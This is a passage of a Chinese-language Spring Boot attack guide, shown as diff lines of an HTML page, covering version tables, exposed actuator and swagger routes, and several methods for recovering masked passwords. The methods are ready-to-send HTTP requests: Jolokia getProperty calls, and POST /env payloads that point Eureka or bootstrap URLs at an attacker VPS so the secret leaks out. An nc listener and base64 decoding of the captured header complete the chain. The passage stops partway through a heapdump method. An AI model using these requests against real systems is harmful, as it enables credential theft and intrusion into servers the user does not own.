+&lt;h3 id=&quot;0x02版本知识&quot;&gt;0x02：版本知识&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;常见组件的版本相互依赖关系&quot;&gt;常见组件的版本相互依赖关系：&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;依赖项&lt;/th&gt;
+      &lt;th&gt;版本列表及依赖组件版本&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-boot-starter-parent&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent&quot;&gt;spring-boot-starter-parent&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-boot-dependencies&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies&quot;&gt;spring-boot-dependencies&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;spring-cloud-dependencies&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies&quot;&gt;spring-cloud-dependencies&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;spring-cloud-与-spring-boot-大版本之间的依赖关系&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Spring Cloud&lt;/th&gt;
+      &lt;th&gt;Spring Boot&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Angel&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.2.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Brixton&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.3.x、1.4.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Camden&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.4.x、1.5.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Dalston&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Edgware&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Finchley&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.0.x，不兼容 1.5.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Greenwich&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.1.x&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Hoxton&lt;/td&gt;
+      &lt;td&gt;兼容 Spring Boot 2.2.x&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;spring-cloud-小版本号的后缀及含义&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;版本号后缀&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;BUILD-SNAPSHOT&lt;/td&gt;
+      &lt;td&gt;快照版，代码不是固定，处于变化之中&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MX&lt;/td&gt;
+      &lt;td&gt;里程碑版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RCX&lt;/td&gt;
+      &lt;td&gt;候选发布版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RELEASE&lt;/td&gt;
+      &lt;td&gt;正式发布版&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SRX&lt;/td&gt;
+      &lt;td&gt;(修复错误和 bug 并再次发布的)正式发布版&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;一信息泄露&quot;&gt;一：信息泄露&lt;/h2&gt;
+
+&lt;h3 id=&quot;0x01路由地址及接口调用详情泄漏&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;直接访问以下几个路由，验证漏洞是否存在：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api-docs
+/v2/api-docs
+/swagger-ui.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;一些可能会遇到的接口路由变形：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mappings
+/actuator/mappings
+/metrics
+/actuator/metrics
+/beans
+/actuator/beans
+/configprops
+/actuator/configprops
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞&lt;/strong&gt;；&lt;/p&gt;
+
+&lt;p&gt;但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x02配置不当而暴露的路由&quot;&gt;0x02：配置不当而暴露的路由&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;参考 &lt;a href=&quot;https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints&quot;&gt;production-ready-endpoints&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt&quot;&gt;spring-boot.txt&lt;/a&gt;，可能因为配置不当而暴露的默认内置路由可能会有：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/actuator
+/auditevents
+/autoconfig
+/beans
+/caches
+/conditions
+/configprops
+/docs
+/dump
+/env
+/flyway
+/health
+/heapdump
+/httptrace
+/info
+/intergrationgraph
+/jolokia
+/logfile
+/loggers
+/liquibase
+/metrics
+/mappings
+/prometheus
+/refresh
+/scheduledtasks
+/sessions
+/shutdown
+/trace
+/threaddump
+/actuator/auditevents
+/actuator/beans
+/actuator/health
+/actuator/conditions
+/actuator/configprops
+/actuator/env
+/actuator/info
+/actuator/loggers
+/actuator/heapdump
+/actuator/threaddump
+/actuator/metrics
+/actuator/scheduledtasks
+/actuator/httptrace
+/actuator/mappings
+/actuator/jolokia
+/actuator/hystrix.stream
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中对寻找漏洞比较重要接口的有：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；&lt;/p&gt;
+
+    &lt;p&gt;同时有一定概率可以通过 POST 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置一些属性，触发相关 RCE 漏洞。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/trace&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;0x03获取被星号脱敏的密码的明文-方法一&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-jolokia-调用相关-mbean-获取明文&quot;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/h5&gt;
+
+&lt;p&gt;将下面示例中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 键中。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot&lt;/code&gt; Mbean（&lt;strong&gt;可能更通用&lt;/strong&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.cloud.context.environment&lt;/code&gt; Mbean（&lt;strong&gt;需要 spring cloud 相关依赖&lt;/strong&gt;）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04获取被星号脱敏的密码的明文-方法二&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-1&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-1&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-1&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;
+
+&lt;p&gt;将下面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://value:${security.user.password}@your-vps-ip&lt;/code&gt;  中的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 换成自己想要获取的对应的星号 * 遮掩的属性名；&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;your-vps-ip&lt;/code&gt; 换成自己外网服务器的真实 ip 地址。&lt;/p&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四-刷新配置&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五-解码属性值&quot;&gt;步骤五： 解码属性值&lt;/h5&gt;
+
+&lt;p&gt;正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; 头内容：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Authorization: Basic dmFsdWU6MTIzNDU2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmFsdWU6MTIzNDU2&lt;/code&gt;部分使用 base64 解码，即可获得类似明文值 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value:123456&lt;/code&gt;，其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123456&lt;/code&gt; 即是目标星号 * 脱敏前的属性值明文。&lt;/p&gt;
+
+&lt;h3 id=&quot;0x05获取被星号脱敏的密码的明文-方法三&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-2&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;通过 POST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 设置属性触发目标对外网指定地址发起任意 http 请求&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-2&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;参考 UUUUnotfound 提出的 &lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/issues/1&quot;&gt;issue-1&lt;/a&gt;，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-2&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求-1&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-触发对外-http-请求&quot;&gt;步骤三： 触发对外 http 请求&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.cloud.bootstrap.location&lt;/code&gt; 方法（&lt;strong&gt;同时适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka.client.serviceUrl.defaultZone&lt;/code&gt; 方法（&lt;strong&gt;不适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/${security.user.password}&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四-刷新配置-1&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x06获取被星号脱敏的密码的明文-方法四&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;利用条件-3&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可正常 GET 请求目标 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-3&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-找到想要获取的属性名-3&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;
+
